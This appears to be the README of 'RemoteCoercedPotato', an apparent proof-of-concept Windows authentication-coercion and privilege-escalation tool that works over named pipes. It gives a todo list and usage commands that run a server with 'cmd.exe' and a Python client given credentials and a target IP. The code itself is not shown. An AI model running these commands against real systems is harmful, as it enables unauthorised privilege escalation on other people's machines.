# RemoteCoercedPotato
A remote Coerced patate


This is only a POC (for now).


Todo : 

    - Random NamedPipe [DONE]
    
    - Implemention of MS-RPRN interfacce 
    
    - Creation a powershell "NamedPipe server" 


Usage (for now) : 

- Without random namedpipe (default) :

    > $ ./CoercedPotatoServer -c cmd.exe

    > python3 CoercedPotatoClient.py -u user -p password 127.0.0.1 [targeted_IP]


 - Without random namedpipe (given by CoercedPotatoServer output) : 
 
    > $ ./CoercedPotatoServer -c cmd.exe -r true 
        
    > python3 CoercedPotatoClient.py -n [randomnamedpipe] -u user -p password -r true 127.0.0.1 [targeted_IP] 

